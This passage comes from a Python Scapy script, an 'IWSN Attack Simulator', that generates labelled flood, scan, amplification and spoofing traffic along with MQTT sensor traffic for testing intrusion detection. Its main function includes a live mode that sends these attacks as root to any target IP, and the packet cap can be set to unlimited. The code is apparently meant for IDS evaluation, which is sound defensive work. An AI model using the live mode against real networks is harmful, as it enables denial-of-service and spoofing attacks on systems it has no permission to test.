        "240.0.0.1",        # reserved (RFC 6890)
    ]
    for i in range(n):
        src = bad_srcs[i % len(bad_srcs)]
        pkts.append(Ether()/IP(src=src, dst=target)/TCP(sport=RandShort(), dport=80, flags="S"))
    return pkts

# ────────────────── MQTT TRAFFIC GENERATOR ──────────────────

def gen_mqtt_traffic(n_sessions=5, msgs_per_session=20):
    """
    Generate realistic IWSN MQTT sensor traffic.
    Simulates multiple sensor nodes connecting, subscribing, publishing data,
    sending keepalives, and disconnecting — all through a broker.
    """
    pkts = []
    broker = MQTT_BROKER
    base_port = 40000
    
    for sess in range(n_sessions):
        sensor_ip = f"192.168.1.{20 + sess}"
        client_id = f"iwsn_sensor_{sess:02d}"
        sport = base_port + sess
        
        # --- CONNECT handshake ---
        connect_data = build_mqtt_connect(client_id)
        pkts.append(Ether()/IP(src=sensor_ip, dst=broker)/TCP(sport=sport, dport=1883, flags="PA")/Raw(connect_data))
        
        connack_data = build_mqtt_connack()
        pkts.append(Ether()/IP(src=broker, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(connack_data))
        
        # --- SUBSCRIBE to control topic ---
        sub_topic = f"actuators/cmd/node{sess}"
        sub_data = build_mqtt_subscribe(sub_topic)
        pkts.append(Ether()/IP(src=sensor_ip, dst=broker)/TCP(sport=sport, dport=1883, flags="PA")/Raw(sub_data))
        
        suback_data = build_mqtt_suback()
        pkts.append(Ether()/IP(src=broker, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(suback_data))
        
        # --- PUBLISH sensor data ---
        for m in range(msgs_per_session):
            topic = random.choice(IWSN_TOPICS)
            payload_str = get_sensor_payload(topic)
            pub_data = build_mqtt_publish(topic, payload_str)
            pkts.append(Ether()/IP(src=sensor_ip, dst=broker)/TCP(sport=sport, dport=1883, flags="PA")/Raw(pub_data))
            
            # Occasionally add a PINGREQ/PINGRESP keepalive
            if m % 7 == 0:
                pkts.append(Ether()/IP(src=sensor_ip, dst=broker)/TCP(sport=sport, dport=1883, flags="PA")/Raw(build_mqtt_pingreq()))
                pkts.append(Ether()/IP(src=broker, dst=sensor_ip)/TCP(sport=1883, dport=sport, flags="PA")/Raw(build_mqtt_pingresp()))
        
        # --- DISCONNECT ---
        disc_data = build_mqtt_disconnect()
        pkts.append(Ether()/IP(src=sensor_ip, dst=broker)/TCP(sport=sport, dport=1883, flags="PA")/Raw(disc_data))
    
    return pkts

def gen_normal_only(n=500):
    """Clean traffic for false positive testing (includes MQTT)."""
    return gen_normal_packets(n)

# ────────────────────── ATTACK REGISTRY ──────────────────────

ATTACK_REGISTRY = {
    "syn_flood":         {"gen": gen_syn_flood,         "rfc": "RFC 4987, RFC 793",            "type": "SYN Flood"},
    "udp_flood":         {"gen": gen_udp_flood,         "rfc": "RFC 768, RFC 4732",            "type": "UDP Flood"},
    "icmp_flood":        {"gen": gen_icmp_flood,        "rfc": "RFC 792, RFC 4732",            "type": "ICMP Flood"},
    "http_flood":        {"gen": gen_http_flood,        "rfc": "RFC 9110, RFC 4732",           "type": "HTTP Flood"},
    "ping_of_death":     {"gen": gen_ping_of_death,     "rfc": "RFC 791 S3.2, RFC 6274",       "type": "Ping of Death"},
    "land_attack":       {"gen": gen_land_attack,       "rfc": "RFC 6274, CVE-1999-0016",      "type": "Land Attack"},
    "smurf_attack":      {"gen": gen_smurf,             "rfc": "RFC 2827 (BCP 38)",            "type": "Smurf Attack"},
    "fraggle_attack":    {"gen": gen_fraggle,           "rfc": "RFC 768, RFC 6274",            "type": "Fraggle Attack"},
    "teardrop_attack":   {"gen": gen_teardrop,          "rfc": "RFC 791 S3.2, RFC 6274",       "type": "Teardrop Attack"},
    "tcp_syn_scan":      {"gen": gen_syn_scan,          "rfc": "RFC 793 S3.9",                 "type": "TCP SYN Scan"},
    "tcp_connect_scan":  {"gen": gen_connect_scan,      "rfc": "RFC 793",                      "type": "TCP Connect Scan"},
    "udp_scan":          {"gen": gen_udp_scan,          "rfc": "RFC 768",                      "type": "UDP Scan"},
    "xmas_scan":         {"gen": gen_xmas_scan,         "rfc": "RFC 793 S3.9",                 "type": "Xmas Tree Scan"},
    "null_scan":         {"gen": gen_null_scan,          "rfc": "RFC 793 S3.9",                 "type": "NULL Scan"},
    "fin_scan":          {"gen": gen_fin_scan,           "rfc": "RFC 793 S3.9",                 "type": "FIN Scan"},
    "rudy_attack":       {"gen": gen_rudy,              "rfc": "RFC 9110, OWASP",              "type": "RUDY (Slow POST)"},
    "slowloris":         {"gen": gen_slowloris,         "rfc": "RFC 9110, OWASP",              "type": "Slowloris"},
    "dns_amplification": {"gen": gen_dns_amplification, "rfc": "RFC 5358, RFC 5625",           "type": "DNS Amplification"},
    "ntp_amplification": {"gen": gen_ntp_amplification, "rfc": "RFC 5905, CVE-2013-5211",      "type": "NTP Amplification"},
    "arp_spoofing":      {"gen": gen_arp_spoofing,      "rfc": "RFC 826, RFC 5227",            "type": "ARP Spoofing"},
    "ip_spoofing":       {"gen": gen_ip_spoofing,       "rfc": "RFC 2827 (BCP 38)",            "type": "IP Spoofing"},
    "mqtt_traffic":      {"gen": gen_mqtt_traffic,      "rfc": "MQTT v3.1.1 (OASIS)",          "type": "MQTT Traffic"},
}

# ────────────────────── MAIN ──────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="IWSN Attack Simulator v3.0",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    # ── existing args ──────────────────────────────────────────────────────
    parser.add_argument("--preset", default="all", help="Attack name, 'mqtt_traffic', or 'all'")
    parser.add_argument("--difficulty", default="easy", choices=DIFFICULTY_PROFILES.keys())
    parser.add_argument("--output", default="./simulator_output", help="Output directory (PCAP mode)")
    parser.add_argument("--seed", type=int, default=None, help="Random seed for reproducible output")
    parser.add_argument("--list", action="store_true", help="List available attacks")
    # ── live transmission args ─────────────────────────────────────────────
    parser.add_argument(
        "--live", action="store_true",
        help="Transmit packets live on the wire instead of writing PCAP files",
    )
    parser.add_argument(
        "--iface", default=None,
        help="Network interface for live transmission (default: Scapy conf.iface)",
    )
    parser.add_argument(
        "--target", default=None,
        help=f"Override target IP for live attacks (default: {DEFAULT_TARGET})",
    )
    parser.add_argument(
        "--inter", type=float, default=None, metavar="MS",
        help="Inter-packet gap in milliseconds for live mode (default: 0 for floods; "
             "timed attacks honour packet timestamps automatically when omitted)",
    )
    parser.add_argument(
        "--max-pkts", type=int, default=500, dest="max_pkts",
        help="Per-attack packet cap in live mode (default: 500; 0 = no cap)",
    )
    args = parser.parse_args()

    if args.seed is not None:
        random.seed(args.seed)

    # ── live mode pre-flight checks ────────────────────────────────────────
    if args.live:
        if os.geteuid() != 0:
            print("[ERROR] Live transmission requires root privileges.")
            print("        Re-run with: sudo python3 attack_simulator.py --live ...")
            sys.exit(1)

        live_iface = args.iface or str(scapy_conf.iface)
        live_inter = args.inter / 1000.0 if args.inter is not None else None
        live_target = args.target or DEFAULT_TARGET

        # Validate the interface exists before attempting any transmission.
        available = [i.name for i in scapy_conf.ifaces.values()
                     if hasattr(i, 'name') and i.name]
        if live_iface not in available:
            print(f"[ERROR] Interface '{live_iface}' not found.")
            print(f"        Available interfaces on this host:")
            for iface_name in sorted(set(available)):
                print(f"          {iface_name}")
            print()
            print("  Hint: 'br0' only exists after running OVS setup on a node device.")
            print("        To test locally, use your physical NIC or loopback, e.g.:")
            phys = [n for n in sorted(set(available))
                    if n not in ("lo", "localhost") and not n.startswith("docker")]
            if phys:
                print(f"          --iface {phys[0]}")
            sys.exit(1)
    else:
        live_iface = live_inter = live_target = None  # unused in PCAP mode

    if args.list:
        print("\n╔══════════════════════════════════════════════════════════╗")
        print("║    Available Presets (21 Attacks + MQTT + Normal)       ║")
        print("╚══════════════════════════════════════════════════════════╝\n")
        for name, info in ATTACK_REGISTRY.items():
            print(f"  {name:25s} — {info['type']:25s} [{info['rfc']}]")
        print(f"\n  {'normal_traffic':25s} — {'Clean IWSN Traffic (FP)':25s} [N/A]")
        return

    diff = DIFFICULTY_PROFILES[args.difficulty]

    if not args.live:
        output_dir = args.output
        os.makedirs(output_dir, exist_ok=True)

    print("\n╔══════════════════════════════════════════════════════════════╗")
    print("║                                                              ║")
    print("║     IWSN Security — Attack Simulator v3.0                    ║")
    print("║     21 Attacks + MQTT Sensor Traffic + Ground Truth          ║")
    print("║                                                              ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print(f"\n  Difficulty:  {args.difficulty.upper()} — {diff['desc']}")
    if args.live:
        cap_str = str(args.max_pkts) if args.max_pkts > 0 else "unlimited"
        inter_str = f"{args.inter:.1f} ms" if args.inter is not None else "auto (timed) / 0 (floods)"
        print(f"  Mode:        LIVE TRANSMISSION")
        print(f"  Interface:   {live_iface}")
        print(f"  Target:      {live_target}")
        print(f"  Inter-pkt:   {inter_str}")
        print(f"  Pkt cap:     {cap_str} per attack")
        print(f"  Noise:       {diff['noise_pct']}% normal traffic injection")
    else:
        print(f"  Output:      {args.output}")
        print(f"  Noise:       {diff['noise_pct']}% normal traffic injection")
    print()

    attacks_to_run = list(ATTACK_REGISTRY.keys()) if args.preset == "all" else [args.preset]

    if args.live:
        print("═══════════════════════════════════════════════════════════════")
        print("  Transmitting Live")
        print("═══════════════════════════════════════════════════════════════\n")

        total_sent = 0
        try:
            for name in attacks_to_run:
                if name not in ATTACK_REGISTRY:
                    print(f"  ✗ Unknown preset: {name}")
                    continue
                info = ATTACK_REGISTRY[name]

                # Pass custom target to generators that accept one.
                if "target" in info["gen"].__code__.co_varnames:
                    pkts = info["gen"](target=live_target)
                else:
                    pkts = info["gen"]()

                # Apply per-attack packet cap before noise injection.
                if args.max_pkts > 0 and len(pkts) > args.max_pkts:
                    pkts = pkts[:args.max_pkts]

                pkts = mix_noise(pkts, diff["noise_pct"])
                send_live(pkts, name, live_iface, live_inter)
                total_sent += len(pkts)

            # Normal traffic burst (false-positive baseline)
            print("\n  --- Normal IWSN Traffic (False Positive Baseline) ---")
            normal_pkts = gen_normal_only(min(200, args.max_pkts) if args.max_pkts > 0 else 200)
            send_live(normal_pkts, "normal_traffic", live_iface, live_inter)
            total_sent += len(normal_pkts)
        except KeyboardInterrupt:
            print(f"\n\n  [!] Interrupted — {total_sent} packets sent before stopping.")
            sys.exit(0)

        print(f"\n═══════════════════════════════════════════════════════════════")
        print(f"  ✓ Live transmission complete — {total_sent} total packets sent")
        print(f"  Interface: {live_iface}")
        print(f"═══════════════════════════════════════════════════════════════\n")

    else:
        # ── PCAP mode (original behaviour) ────────────────────────────────
        print("═══════════════════════════════════════════════════════════════")
        print("  Generating PCAPs")
        print("═══════════════════════════════════════════════════════════════\n")

        manifest = {
            "generator": "IWSN Attack Simulator v3.0",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "difficulty": args.difficulty,
            "noise_percentage": diff["noise_pct"],
            "attacks": []
        }

        for name in attacks_to_run:
            if name not in ATTACK_REGISTRY:
                print(f"  ✗ Unknown preset: {name}")
                continue
            info = ATTACK_REGISTRY[name]
            pkts = info["gen"]()
            attack_count = len(pkts)
            save_attack(pkts, name, output_dir, manifest, diff["noise_pct"], info["type"], info["rfc"], attack_count)

        # Always generate normal traffic for FP testing
        print("\n  --- Normal IWSN Traffic (False Positive Test) ---")
        normal_pkts = gen_normal_only(500)
        filepath = os.path.join(output_dir, "normal_traffic.pcap")
        wrpcap(filepath, normal_pkts)
        mqtt_count = sum(1 for p in normal_pkts if p.haslayer(TCP) and (p[TCP].dport == 1883 or p[TCP].sport == 1883))
        manifest["attacks"].append({
            "name": "normal_traffic", "file": filepath, "attack_type": "None",
            "rfc_reference": "N/A", "attack_packets": 0, "total_packets": len(normal_pkts),
            "mqtt_packets": mqtt_count,
            "noise_packets": len(normal_pkts), "file_size_bytes": os.path.getsize(filepath),
            "expected_detection": False
        })
        print(f"  ✓ normal_traffic.pcap — {len(normal_pkts)} pkts (clean, {mqtt_count} MQTT)")

        # Save manifest
        manifest_path = os.path.join(output_dir, "manifest.json")
        with open(manifest_path, "w") as f:
            json.dump(manifest, f, indent=2)

        total_mqtt = sum(e.get("mqtt_packets", 0) for e in manifest["attacks"])
        print(f"\n═══════════════════════════════════════════════════════════════")
        print(f"  ✓ Generated {len(manifest['attacks'])} PCAPs + manifest.json")
        print(f"  ✓ Total MQTT packets across all PCAPs: {total_mqtt}")
        print(f"  ✓ Manifest: {manifest_path}")
        print(f"═══════════════════════════════════════════════════════════════\n")

if __name__ == "__main__":
    main()
